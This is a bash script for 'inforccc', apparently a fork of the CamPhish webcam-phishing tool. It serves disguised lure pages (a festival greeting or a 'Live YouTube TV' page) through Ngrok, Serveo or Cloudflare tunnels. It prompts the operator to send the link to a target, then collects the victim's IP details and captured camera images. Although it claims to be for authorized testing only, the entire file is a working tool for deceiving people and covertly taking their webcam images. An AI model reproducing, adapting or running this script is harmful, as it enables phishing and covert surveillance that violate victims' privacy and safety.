
#!/bin/bash
# inforccc v1.1
# Author: cyberwithmanveer
# Forked from CamPhish by baradatipu
# Features: Ngrok, Serveo, Cloudflare Tunnel - Auto link generation
# For authorized penetration testing only

trap 'printf "\n";stop' 2

banner() {
clear
printf "\n"
printf "\e[1;93m  _       _   _   ____   ____    ____    _____   ___  \e[0m\n"
printf "\e[1;93m (_)     (_) | \ | |  _ \ / ___|  / ___|  |_   _| / _ \ \e[0m\n"
printf "\e[1;93m  | |     | | |  \| | |_) | |     | |       | |  | | | |\e[0m\n"
printf "\e[1;93m  | |     | | | |\  |  _ <| |___  | |___    | |  | |_| |\e[0m\n"
printf "\e[1;93m  |_|     |_| |_| \_|_| \_\\\\____|  \____|   |_|   \___/ \e[0m\n"
printf "\n"
printf "\e[1;92m  +++  inforccc  -  Camera Intelligence Tool  +++\e[0m\n"
printf "\e[1;77m  Author : cyberwithmanveer\e[0m\n"
printf "\e[1;77m  GitHub : https://github.com/cyberwithmanveer/inforccc\e[0m\n"
printf "\e[1;77m  Version: 1.1 (Cloudflare + Auto Link)\e[0m\n"
printf "\n"
}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall -2 ssh > /dev/null 2>&1
fi
if [[ $checkcloudflared == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
if [[ -e index.html ]]; then
rm -rf index.html
fi
if [[ -e index.php ]]; then
rm -rf index.php
fi
if [[ -e index2.html ]]; then
rm -rf index2.html
fi
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] inforccc stopped. Processes cleaned.\n"
exit 1
}

dependencies() {
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Checking dependencies...\n"
command -v php > /dev/null 2>&1 || { echo >&2 "PHP is required but not installed."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is required but not installed."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "SSH is required but not installed."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is required but not installed."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Wget is required but not installed."; exit 1; }
command -v tmux > /dev/null 2>&1 || { echo >&2 "Tmux is required but not installed. Install: apt-get install tmux"; exit 1; }
}

download_cloudflared() {
if [[ -e cloudflared ]]; then
return
fi
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflare Tunnel...\n"
arch=$(uname -m)
if [[ $arch == "x86_64" ]]; then
wget --no-check-certificate -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
elif [[ $arch == "i386" || $arch == "i686" ]]; then
wget --no-check-certificate -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
elif [[ $arch == "aarch64" ]]; then
wget --no-check-certificate -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
elif [[ $arch == "armv7l" || $arch == "arm" ]]; then
wget --no-check-certificate -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
else
printf "\e[1;93m[!] Unknown architecture: $arch. Trying amd64...\e[0m\n"
wget --no-check-certificate -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
fi
chmod +x cloudflared
if [[ -e cloudflared ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflare tunnel downloaded successfully\n"
else
printf "\e[1;93m[!] Cloudflare download failed. Check internet connection.\e[0m\n"
exit 1
fi
}

select_template() {
default_option_tem="1"
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template:\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live YouTube TV\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Select template [Default is 1]: \e[0m' option_tem
option_tem="${option_tem:-${default_option_tem}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
else
printf "\e[1;93m [!] Invalid template option! Try again\e[0m\n"
sleep 1
select_template
fi
}

payload_generate() {
local tunnel_url="$1"
sed 's+forwarding_link+'$tunnel_url'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$tunnel_url'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$tunnel_url'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html
}

checkfound() {
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Waiting for target...\n"
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Press Ctrl+C to exit\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Send this link to target:\e[0m\e[1;77m %s\e[0m\n" $link
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Link copied to clipboard (if xclip available)\e[0m\n"
echo -n "$link" | xclip -selection clipboard > /dev/null 2>&1 || echo -n "$link" | xsel -b > /dev/null 2>&1 || true

while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Target opened the link!\n"
while IFS= read -r line; do
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] $line\n"
done < ip.txt
rm -rf ip.txt
fi

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m] Camera access detected!\n"
while IFS= read -r line; do
printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m] $line\n"
done < Log.log
rm -rf Log.log
fi

for cam_file in cam*.png; do
if [ -f "$cam_file" ]; then
printf "\n\e[1;92m[\e[0m\e[1;91m!\e[0m\e[1;92m] Camera image captured: $cam_file\n"
mv "$cam_file" "$cam_file.captured" 2>/dev/null
fi
break
done

sleep 0.5
done
}

start_ngrok() {
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is required."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Wget is required."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
wget --no-check-certificate -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip -q ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux: pkg install wget\e[0m\n"
exit 1
fi
else
wget --no-check-certificate -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip -q ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error...\e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok server...\n"
tmux new-session -d -s ngrok './ngrok http 3333' > /dev/null 2>&1
sleep 8

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o 'https://[0-9a-zA-Z]*\.ngrok-free.app' | head -n1)
if [[ -z "$link" ]]; then
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o 'https://[0-9a-zA-Z]*\.ngrok.io' | head -n1)
fi
if [[ -z "$link" ]]; then
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"[^"]*"' | cut -d'"' -f4 | head -n1)
fi

if [[ -z "$link" ]]; then
printf "\e[1;93m[!] Could not get Ngrok URL. Trying again...\e[0m\n"
sleep 5
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"[^"]*"' | cut -d'"' -f4 | head -n1)
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok URL:\e[0m\e[1;77m %s\e[0m\n" $link
payload_generate "$link"
checkfound
}

start_serveo() {
printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Serveo server...\n"

subdomain="inforccc$RANDOM"
printf "\e[1;92m[\e[0m+\e[1;92m] Using subdomain: $subdomain\e[0m\n"

tmux new-session -d -s serveo "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $subdomain:80:127.0.0.1:3333 serveo.net" > /dev/null 2>&1
sleep 8

# Get the serveo URL
link="https://$subdomain.serveo.net"
printf "\e[1;92m[\e[0m*\e[1;92m] Serveo URL:\e[0m\e[1;77m %s\e[0m\n" $link
payload_generate "$link"
checkfound
}

start_cloudflare() {
download_cloudflared
printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflare tunnel...\n"

# Run cloudflared tunnel in tmux
tmux new-session -d -s cloudflared './cloudflared tunnel --url http://127.0.0.1:3333 --no-autoupdate' > /dev/null 2>&1
sleep 5

# Try to get the URL from cloudflared logs
for i in 1 2 3 4 5 6 7 8 9 10; do
link=$(tmux capture-pane -t cloudflared -p 2>/dev/null | grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare.com' | head -n1)
if [[ -n "$link" ]]; then
break
fi
sleep 2
done

if [[ -z "$link" ]]; then
# Try alternative: check the cloudflared json endpoint
link=$(curl -s http://127.0.0.1:3333/ 2>/dev/null | head -n1 || true)
if [[ -z "$link" ]] || [[ "$link" != https://* ]]; then
# Fallback: read from cloudflared log file if any
link=$(tmux capture-pane -t cloudflared -p 2>/dev/null | grep -oE 'https?://[a-zA-Z0-9.-]+\.trycloudflare\.com' | head -n1)
fi
fi

if [[ -z "$link" ]]; then
printf "\e[1;93m[!] Could not get Cloudflare URL. Check tmux session: tmux attach -t cloudflared\e[0m\n"
link="http://127.0.0.1:3333"
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Cloudflare URL:\e[0m\e[1;77m %s\e[0m\n" $link
payload_generate "$link"
checkfound
}

inforccc_main() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n----- Choose Tunnel Server -----\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare Tunnel (NEW - Auto Link)\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose Port Forwarding [Default: 1]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template

if [[ $option_server -eq 1 ]]; then
start_ngrok
elif [[ $option_server -eq 2 ]]; then
start_serveo
elif [[ $option_server -eq 3 ]]; then
start_cloudflare
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
inforccc_main
fi
}

banner
dependencies
inforccc_main
